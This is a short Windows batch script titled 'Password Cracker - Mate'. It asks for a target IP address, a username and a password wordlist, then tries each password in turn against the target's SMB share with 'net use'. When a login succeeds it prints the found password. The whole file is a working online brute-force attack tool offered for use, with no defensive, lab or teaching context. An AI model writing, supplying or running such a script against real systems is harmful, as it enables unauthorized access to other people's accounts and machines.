@echo off
setlocal EnableDelayedExpansion
color 0A
title Password Cracker - Mate

cls
echo ================================================
echo           Password Cracker - Mate
echo ================================================
echo.

set /p ip="Enter IP Address: " 
set /p user="Enter Username: " 
set /p wordlist="Enter Password List File: "

for /f "delims=" %%a in ('type "%wordlist%"') do (
    set pass=%%a
    call :attempt
)

echo.
echo Password Not Found :(
pause
exit

:success
net use \\%ip% /d /y >nul 2>&1
echo.
echo Password Found!: !pass!
pause
exit

:attempt
net use \\%ip% /user:%user% "!pass!" >nul 2>&1
echo Trying: !pass!
if !errorlevel! EQU 0 goto success
exit /b
